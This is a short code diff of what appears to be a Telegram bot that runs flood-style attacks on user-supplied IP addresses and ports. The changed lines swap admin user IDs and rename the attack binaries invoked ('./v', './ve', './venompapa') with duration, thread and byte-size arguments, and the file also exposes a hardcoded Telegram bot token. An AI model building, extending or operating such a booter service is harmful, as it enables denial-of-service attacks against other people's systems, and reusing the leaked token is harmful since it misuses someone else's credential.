@@ -23,9 +23,8 @@ attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
 TELEGRAM_BOT_TOKEN = '7715609619:AAHzD-H2qh6RLfkWiJLQxY6iKLC6_JnplyM'
-# Bot Configuration
-ADMIN_USER_IDS = [5730843286, 6659804884]  # Replace 1234567890 with the second admin ID
-ADMIN_USER_IDS = [5730843286, 6659804884]  # Replace 1234567890 with the second admin ID
+ADMIN_USER_ID = 1380020178
+ADMIN_USER_ID = 1380020178 
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
 user_attack_history = {}
@@ -674,9 +673,9 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./v {ip} {port} {duration}"
+        attack_command = f"./ve {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./ve {ip} {port} {duration} {threads}"
+        attack_command = f"./venompapa {ip} {port} {duration} {threads}"
     elif argument_type == 5:
         attack_command = f"./venompapa {ip} {port} {duration} {byte_size} {threads}"
 
